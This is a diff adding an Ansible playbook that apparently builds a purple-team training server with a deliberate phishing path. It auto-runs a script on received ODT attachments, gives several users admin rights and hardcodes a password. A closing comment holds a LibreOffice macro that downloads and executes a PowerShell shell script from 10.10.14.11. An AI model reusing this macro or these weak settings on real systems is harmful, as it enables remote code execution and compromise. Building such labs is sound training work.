@@ -1,0 +1,175 @@
+---
+- name: Configure Supporting Servers (SRV)
+  hosts:
+    - t1srv
+    #- g1srv
+    #- g2srv
+    #- g3srv
+    #- g4srv
+    #- g5srv
+  gather_facts: yes
+
+  tasks:
+    - name: "Add SRV to the Domain"
+      win_domain_membership:
+        dns_domain_name: "{{ domainName }}"
+        hostname: "{{ hostname }}"
+        domain_admin_user: "administrator@{{ domainName }}"
+        domain_admin_password: "{{ ansiblePassword }}"
+        state: domain
+      register: domain_state
+      retries: 10
+      delay: 30
+      until: domain_state is success
+
+    - name: Reboot system
+      win_reboot:
+      when: domain_state.reboot_required
+
+    - name: Create Folder Structure for File Shares - Music
+      win_file:
+        path: c:\shares\music
+        state: directory
+    
+    - name: Create Folder Structure for File Shares - Files
+      win_file:
+        path: c:\shares\files
+        state: directory
+    
+    - name: Create Folder Structure for Email Processing - Attachments
+      win_file:
+        path: c:\attachments
+        state: directory
+
+
+    # Dependency: ansible-galaxy collection install ansible.windows
+    - name: Add public music share
+      ansible.windows.win_share:
+        name: music
+        description: Collection of Music
+        path: c:\shares\music
+        list: yes
+        full: Bradly.Marks,Deann.Blackburn,Barbara.Madden,Orval.Anderson 
+        read: Everyone
+
+    - name: Add files share
+      ansible.windows.win_share:
+        name: files
+        description: Installation Files
+        path: c:\shares\files
+        list: yes
+        full: Bradly.Marks,Deann.Blackburn,Barbara.Madden,Orval.Anderson 
+        read: Everyone
+
+    - name: Add members to the remote desktop users group and local administrators group
+      ansible.windows.win_group_membership:
+        name: Remote Desktop Users
+        members: Bradly.Marks,Deann.Blackburn,Barbara.Madden,Orval.Anderson 
+        state: present
+    
+    - name: Add users to the remote desktop users group and local administrators group
+      ansible.windows.win_group_membership:
+        name: Administrators
+        members: Bradly.Marks,Deann.Blackburn,Barbara.Madden,Orval.Anderson 
+        state: present
+
+    - name: Copy 7-zip install to c:\shares\files
+      ansible.windows.win_copy:
+        src: "{{ ansibleDirectory }}/files/7zipFiles/7z.msi"
+        dest: c:\shares\files
+
+    - name: Install 7zip and use a file version for the installation check
+      win_package:
+        path: 'c:\shares\files\7z.msi'
+        state: present
+
+    # Setup Purple Attack Path Phish
+    
+    - name: Copy Firefox to c:\shares\files
+      ansible.windows.win_copy:
+        src: "{{ ansibleDirectory }}/files/firefox103.msi"
+        dest: 'c:\shares\files\firefox103.msi'
+
+    - name: Install Firefox 
+      win_package:
+        path: 'c:\shares\files\firefox103.msi'
+        state: present
+
+    - name: Copy Thunderbird to c:\shares\files
+      ansible.windows.win_copy:
+        src: "{{ ansibleDirectory }}/files/thunderbird102.msi"
+        dest: 'c:\shares\files\thunderbird102.msi'
+
+    - name: Install Thunderbird
+      win_package:
+        path: 'c:\shares\files\thunderbird102.msi'
+        state: present
+
+    - name: Copy Libre Office to c:\shares\files
+      ansible.windows.win_copy:
+        src: "{{ ansibleDirectory }}/files/libre7_3_5.msi"
+        dest: 'c:\shares\files\libre7_3_5.msi'
+
+    - name: Install Libre Office
+      win_package:
+        path: 'c:\shares\files\libre7_3_5.msi'
+        state: present
+
+    - name: Copy Microsoft JDK to c:\shares\files
+      ansible.windows.win_copy:
+        src: "{{ ansibleDirectory }}/files/microsoftJDK17.msi"
+        dest: 'c:\shares\files\microsoftJDK17.msi'
+
+    - name: Install Microsoft JDK
+      win_package:
+        path: 'c:\shares\files\microsoftJDK17.msi'
+        state: present
+
+    - name: Copy Powershell to Auto-Open ODT Files
+      ansible.windows.win_copy:
+        src: "{{ ansibleDirectory }}/files/pwshProcessODT.ps1"
+        dest: 'c:\shares\files\pwshProcessODT.ps1'
+
+    - name: Copy registrymodifications.xcu for Libre Office Config
+      ansible.windows.win_copy:
+        src: "{{ ansibleDirectory }}/files/registrymodifications.xcu"
+        dest: 'c:\shares\files\registrymodifications.xcu'
+
+    - name: Create a task to run the pwshProcessODT
+      community.windows.win_scheduled_task:
+        name: Process ODT
+        username: "Bradly.Marks"
+        logon_type: s4u
+        password: "vsD0qaLZd"
+        description: Run the Process ODT Powershell Script
+        enabled: yes
+        actions:
+        - path: powershell.exe
+          arguments: -ExecutionPolicy Unrestricted -NonInteractive -File c:\shares\files\pwshProcessODT.ps1
+        triggers:
+        - type: daily
+          start_boundary: '2023-02-20T01:00:00'
+          repetition:
+            interval: PT5M
+        state: present
+
+
+# Setup instructions for the Purple Phish Sections
+# -- Setup on a user profile that is a member of the domain ---
+# Setup Email Account in Thunderbird - Using Sophia Noorda for now...
+# prayut.c@yahoo.com
+# -- Pull password from password safe --
+#
+# Install the add-on FiltaQuilla
+# In the settings for the FiltaQuilla enable the "Save attachments to..."
+# Configure the filter... On menu go to message --> Filter
+# # Created with subject containing "RE:"
+# # Save Attachments to "C:\attachments"
+
+#
+# Macro created...
+# REM  *****  BASIC  *****
+# Sub Main
+#  Shell("cmd /c powershell ""iex(new-object net.webclient).downloadstring('http://10.10.14.11/shell.ps1')""")
+# End Sub
+#    
